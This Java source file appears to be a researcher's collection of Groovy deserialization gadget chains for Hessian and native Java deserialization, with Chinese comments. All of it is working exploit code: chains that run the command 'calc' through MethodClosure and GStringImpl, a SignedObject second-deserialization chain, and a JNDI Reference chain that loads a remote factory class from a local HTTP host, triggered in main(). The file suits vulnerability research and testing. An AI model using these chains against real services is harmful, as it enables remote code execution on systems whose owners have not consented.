package com.test.gadget;

import com.alibaba.fastjson.JSONArray;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;
import tools.HessianTools;
import tools.ReflectTools;
import tools.TemplatesGen;

import javax.management.BadAttributeValueExpException;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.Serializable;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.security.*;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.TreeMap;

public class GroovyBased {
    public static void main(String[] args) throws Exception {
        Object o = groovyRef("Calc", "http://127.0.0.1:7777/");
        byte[] bytes = HessianTools.hessianSer2bytes(o, "2");
        HessianTools.hessianDeser(bytes, "2");
    }

    /**
     * groovy 能直接将字符串作为命令执行。例如，'ls'.execute()
     * @return
     * @throws IllegalAccessException
     */
    public static Object gString1() throws IllegalAccessException {
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ReflectTools.setFieldValue(methodClosure, "maximumNumberOfParameters", 0);

        String[] strings = {"any"};
        Object[] values = {methodClosure};

        GStringImpl gString = new GStringImpl(values, strings);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(gString, "any");

        return hashMap;
    }

    /**
     * 调用 SignedObject#getObject 二次反序列化
     * @return
     * @throws Exception
     */
    public static Object gString2() throws Exception{
        Templates templates = TemplatesGen.getTemplates2(null, "D:/1tmp/classes/Calc.class");
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("any");
        ReflectTools.setFieldValue(bad, "val",  jsonArray);

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(bad, privateKey, signingEngine);

        MethodClosure methodClosure = new MethodClosure(signedObject, "getObject");
        ReflectTools.setFieldValue(methodClosure, "maximumNumberOfParameters", 0);

        String[] strings = {"any"};
        Object[] values = {methodClosure};

        GStringImpl gString = new GStringImpl(values, strings);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(gString, "any");

        return hashMap;
    }

    /**
     * ConvertedClosure作为动态代理，通过 TreeMap#compare触发
     * @param factory
     * @param factoryLocation
     * @return
     * @throws Exception
     */
    public static Object groovyRef(String factory, String factoryLocation) throws Exception{
        Reference reference = new Reference("Calc", factory, factoryLocation);

        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(reference);
        Class<?> aClass = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        declaredConstructor.setAccessible(true);
        Object c1 = declaredConstructor.newInstance(cpe, new Hashtable<>());

        MethodClosure methodClosure = new MethodClosure(c1,"listBindings");

        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "compareTo");

        Object o = Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), new Class[]{Comparable.class}, convertedClosure);

        Class<?> e = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);
        declaredConstructor1.setAccessible(true);
        // 根键值对，这里的键会作为最终调用的方法的参数
        Object a = declaredConstructor1.newInstance("a", 1, null);

        Constructor<?> declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);
        declaredConstructor2.setAccessible(true);
        // 作为根节点的右子树，键为动态代理
        Object o1 = declaredConstructor2.newInstance(o, 2, a);

        Class<?> t = Class.forName("java.util.TreeMap");
        TreeMap treeMap = (TreeMap) t.newInstance();

        Field size = t.getDeclaredField("size");
        size.setAccessible(true);
        size.set(treeMap, 2);

        Field modCount = t.getDeclaredField("modCount");
        modCount.setAccessible(true);
        modCount.set(treeMap, 2);

        Field root = t.getDeclaredField("root");
        root.setAccessible(true);
        root.set(treeMap, a);

        // 设置根节点的右子树
        Field right = e.getDeclaredField("right");
        right.setAccessible(true);
        right.set(a, o1);

        return treeMap;
    }

    // 适用于原生反序列化
    public static Object groovy1() throws Exception{
        MethodClosure methodClosure = new MethodClosure("calc","execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure,"entrySet");
        Class<?> AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Map handler = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},closure);
        Object object = constructor.newInstance(Target.class,handler);
        return object;
    }
}
